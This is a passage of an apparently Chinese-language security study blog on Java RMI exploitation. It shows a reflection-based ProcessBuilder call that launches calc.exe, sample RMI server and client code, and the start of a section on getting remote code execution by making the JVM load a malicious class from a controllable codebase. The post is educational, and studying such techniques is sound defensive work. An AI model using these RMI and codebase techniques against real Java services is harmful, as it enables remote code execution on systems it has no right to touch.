&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">ProcessBuilder&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[][]{{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}})).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rmi">RMI&lt;/h2>
&lt;p>即Remote Method Invocation，不让它RCE都对不起这个R&lt;/p>
&lt;h3 id="通信实现">通信实现&lt;/h3>
&lt;p>Server编写实现类并注册为服务createRegistry，Client查找服务并获得接口实例getRegistry，两者共享相同的接口interface&lt;/p>
&lt;p>当Client连接时，首先连接Registry并寻找想要的对象，发送Call消息；之后Server返回对象（序列化数据），ReturnData消息；Client收到后反序列化得到远程对象，与其建立TCP连接，在这个新的连接中才会在Server端执行方法调用&lt;/p>
&lt;p>可以直接通过rmi://xxx:xxx/这样的地址获取所有绑定的对象（直通RMI Registry后台&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://ip:port&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于rebind, bind, unbind这样的危险方法只有当来源是locahost才行，远程用不了&lt;/p>
&lt;p>对于反序列化数据，可以用&lt;a href="https://github.com/NickstaDB/SerializationDumper/releases/">SerializationDumper&lt;/a>进行分析，用wireshark 复制-&amp;gt; as a hex Stream&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -jar SerializationDumper-v1.1.jar &lt;span style="color:#d88200">&amp;#34;deadbeaf&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html&lt;/a>&lt;/p>
&lt;p>一个简单的rmiserver&amp;amp;rmiclient的栗子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Remote&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.server.UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RMIServer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">IRemoteHelloWorld&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RemoteHelloWorld&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">IRemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#75af00">RemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;call from&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello world&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">RemoteHelloWorld&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">9092&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://127.0.0.1:9092/Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RMIServer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">server.RMIServer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TrainMain&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">RMIServer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IRemoteHelloWorld&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RMIServer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IRemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://192.168.31.175:9092/Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="codebase-to-rce">codebase to RCE&lt;/h3>
&lt;p>codebase是类似classpath的一个地址，告知JVM去哪里搜索类，常用于http, ftp这样远程的情况&lt;/p>
&lt;p>在RMI通信过程中，反序列化对象时寻找类时先在自己的classpath下寻找，如果本地找不到就回去远程加载codebase中的类，假如我们指定&lt;code>codebase=http://example.com/&lt;/code> 然后加载&lt;code>org.test.vuln&lt;/code>类，jvm就会下载&lt;code>http://example.com/org/test/vuln.class&lt;/code> 并将其作为vuln类的字节码进行加载&lt;/p>
&lt;p>所以如果codebase可控，再满足以下条件，就可以加载恶意类了：&lt;/p>
&lt;ul>
&lt;li>安装并配置了SecurityManager&lt;/li>
&lt;li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false&lt;/li>
&lt;/ul>
&lt;p>java.rmi.server.useCodebaseOnly是在Java 7u21、6u45的时候修改的一个默认设置，值由false改为了true；在为true的情况下JVM只信任预先配置好的codebase，不支持从RMI中获取，以下是测试代码：&lt;/p>
&lt;p>Server部分&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Icalc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Remote&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">ICalc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Calc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.server.UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Calc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ICalc&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Calc&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">sum&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// CalcServer.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CalcServer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSecurityManager&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Setup SecurityManager&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSecurityManager&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecurityManager&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Calc&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Calc&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">9093&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://192.168.31.175:9093/refobj&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.security.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;E:\\JavaStudy\\test01\\client.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.hostname&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;192.168.31.175&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.useCodebaseOnly&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;false&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
